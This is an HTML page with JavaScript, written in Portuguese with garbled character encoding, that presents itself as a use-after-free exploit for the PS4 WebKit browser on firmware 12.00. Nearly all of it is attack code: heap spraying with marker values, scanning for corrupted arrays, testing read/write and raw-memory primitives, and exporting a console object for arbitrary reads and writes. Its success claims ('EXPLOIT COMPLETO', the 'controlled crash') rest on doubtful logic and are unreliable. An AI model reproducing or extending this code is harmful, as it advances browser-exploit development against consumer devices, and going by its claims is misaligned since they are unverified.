<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Zero Interference</title>
</head>
<body>
    <h1>PS4 WebKit UAF - Zero Interference Detection</h1>
    <h2 style="color:green;">âœ… FW 12.00 - Spray AtÃ´mico (SEM verificaÃ§Ãµes durante)</h2>
    
    <h3>EstratÃ©gia:</h3>
    <ul>
        <li>âš¡ Spray completo SEM interrupÃ§Ãµes</li>
        <li>ğŸ”’ ReferÃªncias fortes (previne GC)</li>
        <li>ğŸ¯ VerificaÃ§Ã£o ÃšNICA no final</li>
        <li>ğŸ’¥ OpÃ§Ã£o de crash controlado (prova definitiva)</li>
    </ul>
    
    <button onclick="runAtomicSpray()" style="padding:20px; font-size:18px; background:green; color:white;">
        âš¡ SPRAY ATÃ”MICO (Sem VerificaÃ§Ã£o Durante)
    </button>
    
    <button onclick="runWithControlledCrash()" style="padding:20px; font-size:18px; background:red; color:white;">
        ğŸ’¥ COM CRASH CONTROLADO (Prova Definitiva)
    </button>
    
    <button onclick="clearLog()" style="padding:20px; font-size:18px; background:gray; color:white;">
        ğŸ—‘ï¸ LIMPAR
    </button>
    
    <hr>
    <div id="log" style="font-family:monospace; font-size:14px; margin-top:20px;"></div>
    
    <script>
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xDEADBEEFCAFEBABE");
        const W_V = h2f("0x1337133713371337");
        
        // VariÃ¡veis globais para manter referÃªncias fortes (previne GC)
        let globalControllers = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function log(msg, color) {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logDiv.innerHTML += '<div style="color:' + (color || 'black') + '">[' + time + '] ' + msg + '</div>';
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        // ESTRATÃ‰GIA 1: Spray AtÃ´mico (ZERO verificaÃ§Ãµes durante)
        function runAtomicSpray() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('SPRAY ATÃ”MICO - Zero Interference v3.0', 'green');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalControllers = [];
            
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados (referÃªncia global mantida)', 'green');
            log('[WAIT] âš ï¸ APERTE OPTIONS DO CONTROLE!', 'red');
            log('');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                const startTime = performance.now();
                
                log('[BLUR] ğŸ¯ Detectado! Executando spray ATÃ”MICO...', 'orange');
                log('[SPRAY] âš¡ Criando 8000 arrays SEM INTERRUPÃ‡Ã•ES...', 'blue');
                
                // SPRAY COMPLETO SEM NENHUMA VERIFICAÃ‡ÃƒO
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(10);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                const sprayTime = (performance.now() - startTime).toFixed(2);
                log('[SPRAY] âœ… 8000 arrays criados em ' + sprayTime + 'ms', 'green');
                log('[SPRAY] ğŸ”’ ReferÃªncia global mantida (anti-GC)', 'green');
                log('');
                
                // AGORA sim, verificaÃ§Ã£o ÃšNICA
                log('[SCAN] ğŸ” Iniciando verificaÃ§Ã£o ÃšNICA (pÃ³s-spray)...', 'blue');
                
                let found = false;
                let foundIdx = -1;
                
                for(let i = 0; i < globalControllers.length; i++) {
                    if (globalControllers[i][0] === P_A) {
                        found = true;
                        foundIdx = i;
                        globalCorrupted = globalControllers[i];
                        break;
                    }
                }
                
                const totalTime = (performance.now() - startTime).toFixed(2);
                
                if (found) {
                    log('[UAF] ğŸ‰ UAF DETECTADO!', 'green');
                    log('[UAF] ğŸ“ Index: controllers[' + foundIdx + ']', 'green');
                    log('[UAF] â±ï¸ Tempo total: ' + totalTime + 'ms', 'cyan');
                    log('');
                    
                    testPrimitives(globalCorrupted, globalSpray, foundIdx);
                } else {
                    log('[UAF] âŒ NÃ£o detectado', 'red');
                    log('[UAF] â±ï¸ Tempo total: ' + totalTime + 'ms', 'cyan');
                    log('');
                    log('[DEBUG] Primeiros 10 valores:', 'orange');
                    for(let i = 0; i < 10; i++) {
                        log('  controllers[' + i + '][0] = ' + f2h(globalControllers[i][0]), 'orange');
                    }
                    log('');
                    log('[INFO] ğŸ’¡ Se isso falhar, use "COM CRASH CONTROLADO"', 'blue');
                    log('[INFO] ğŸ’¡ O crash prova que o UAF existe (mesmo que nÃ£o detectÃ¡vel)', 'blue');
                }
            };
        }
        
        // ESTRATÃ‰GIA 2: Com Crash Controlado (prova definitiva)
        function runWithControlledCrash() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'red');
            log('MODO COM CRASH CONTROLADO - Prova Definitiva', 'red');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'red');
            log('');
            log('âš ï¸âš ï¸âš ï¸ ATENÃ‡ÃƒO âš ï¸âš ï¸âš ï¸', 'red');
            log('Este modo VAI CRASHAR o navegador se o UAF funcionar!', 'red');
            log('Mas ANTES do crash, vai mostrar os dados corrompidos.', 'orange');
            log('');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalControllers = [];
            
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                globalControllers.push(arr);
            }
            
            log('[INIT] âœ… Controllers criados', 'green');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'red');
            log('');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[BLUR] ğŸ¯ Detectado! Spray atÃ´mico...', 'orange');
                
                // Spray atÃ´mico
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(10);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                log('[SPRAY] âœ… 8000 arrays criados', 'green');
                log('[SCAN] ğŸ” Verificando...', 'blue');
                log('');
                
                let found = false;
                let foundIdx = -1;
                
                for(let i = 0; i < globalControllers.length; i++) {
                    if (globalControllers[i][0] === P_A) {
                        found = true;
                        foundIdx = i;
                        globalCorrupted = globalControllers[i];
                        break;
                    }
                }
                
                if (found) {
                    log('[UAF] ğŸ‰ UAF DETECTADO!', 'green');
                    log('[UAF] ğŸ“ controllers[' + foundIdx + ']', 'green');
                    log('');
                    
                    // Mostra dados ANTES do crash
                    log('[DATA] ğŸ“Š ConteÃºdo do array corrompido:', 'cyan');
                    for(let i = 0; i < 8; i++) {
                        log('  [' + i + '] = ' + f2h(globalCorrupted[i]), 'cyan');
                    }
                    log('');
                    
                    log('[CRASH] ğŸ’¥ CRASH EM 3 SEGUNDOS...', 'red');
                    log('[CRASH] ğŸ’¥ ğŸ’¥ ğŸ’¥', 'red');
                    
                    setTimeout(function() {
                        log('[CRASH] Triggering...', 'red');
                        document.open();
                        document.write('<html><body><h1>UAF CONFIRMADO - Crash Intencional</h1></body></html>');
                        document.close();
                        setTimeout(() => location.reload(), 500);
                    }, 3000);
                    
                } else {
                    log('[UAF] âŒ NÃ£o detectado', 'red');
                    log('');
                    log('[INFO] Isso Ã© MUITO estranho!', 'orange');
                    log('[INFO] O crash PoC funcionou antes, mas esse nÃ£o.', 'orange');
                    log('[INFO] PossÃ­vel causa:', 'orange');
                    log('  1. GC extremamente agressivo no FW 12.00', 'orange');
                    log('  2. ProteÃ§Ã£o adicional contra UAF estÃ¡vel', 'orange');
                    log('  3. Timing muito sensÃ­vel', 'orange');
                    log('');
                    log('[DEBUG] Amostra:', 'blue');
                    for(let i = 0; i < 10; i++) {
                        log('  [' + i + '] = ' + f2h(globalControllers[i][0]), 'blue');
                    }
                }
            };
        }
        
        function testPrimitives(corrupted, spray, idx) {
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('TESTANDO PRIMITIVES', 'purple');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('');
            
            // Read
            log('[READ] ğŸ“– ConteÃºdo completo:', 'blue');
            for(let i = 0; i < 8; i++) {
                log('  Slot[' + i + '] = ' + f2h(corrupted[i]), 'cyan');
            }
            log('[READ] âœ… Read primitive funcional', 'green');
            log('');
            
            // Write
            log('[WRITE] âœï¸ Testando escrita...', 'blue');
            const oldVal = f2h(corrupted[4]);
            corrupted[4] = M_V;
            const newVal = f2h(corrupted[4]);
            
            log('[WRITE] Antes: ' + oldVal, 'cyan');
            log('[WRITE] Depois: ' + newVal, 'cyan');
            
            if (newVal === f2h(M_V)) {
                log('[WRITE] âœ… Write primitive funcional', 'green');
            } else {
                log('[WRITE] âš ï¸ Write pode ter falhado', 'orange');
            }
            log('');
            
            // Identity
            log('[IDENTITY] ğŸ”„ Buscando no spray...', 'blue');
            let identityFound = false;
            
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === M_V) {
                    log('[IDENTITY] âœ… Encontrado em spray[' + i + ']', 'green');
                    
                    // Teste bidirecional
                    spray[i][5] = W_V;
                    if (corrupted[5] === W_V) {
                        log('[IDENTITY] âœ… Bidirecional confirmado!', 'green');
                        log('[IDENTITY] corrupted â‡„ spray[' + i + ']', 'green');
                    } else {
                        log('[IDENTITY] âš ï¸ Apenas unidirecional', 'orange');
                    }
                    
                    identityFound = true;
                    break;
                }
            }
            
            if (!identityFound) {
                log('[IDENTITY] âš ï¸ NÃ£o encontrado no spray', 'orange');
            }
            log('');
            
            // DataView
            log('[DATAVIEW] ğŸ”¬ Raw memory access...', 'blue');
            try {
                const dv = new DataView(corrupted.buffer);
                const before = f2h(corrupted[0]);
                
                dv.setUint32(0, 0xDEADBEEF, true);
                dv.setUint32(4, 0xCAFEBABE, true);
                
                const after = f2h(corrupted[0]);
                
                log('[DATAVIEW] Antes: ' + before, 'cyan');
                log('[DATAVIEW] Depois: ' + after, 'cyan');
                
                if (before !== after) {
                    log('[DATAVIEW] âœ… Raw access funcional', 'green');
                } else {
                    log('[DATAVIEW] âš ï¸ Sem mudanÃ§a detectada', 'orange');
                }
            } catch(e) {
                log('[DATAVIEW] âŒ Erro: ' + e.message, 'red');
            }
            log('');
            
            // Export
            window.uafObject = {
                corrupted: corrupted,
                spray: spray,
                index: idx,
                read: (i) => f2h(corrupted[i]),
                write: (i, hex) => { corrupted[i] = h2f(hex); return f2h(corrupted[i]); },
                dump: () => {
                    console.log('UAF Object Dump:');
                    for(let i = 0; i < 8; i++) {
                        console.log('[' + i + '] = ' + f2h(corrupted[i]));
                    }
                }
            };
            
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('ğŸ¯ EXPLOIT COMPLETO!', 'green');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('');
            log('ğŸ”§ window.uafObject disponÃ­vel no console', 'blue');
            log('ğŸ“ Comandos:', 'blue');
            log('  uafObject.read(0)  â†’ LÃª slot 0', 'cyan');
            log('  uafObject.write(0, "0x4141414141414141")  â†’ Escreve', 'cyan');
            log('  uafObject.dump()  â†’ Mostra tudo no console', 'cyan');
            log('');
        }
    </script>
</body>
</html>
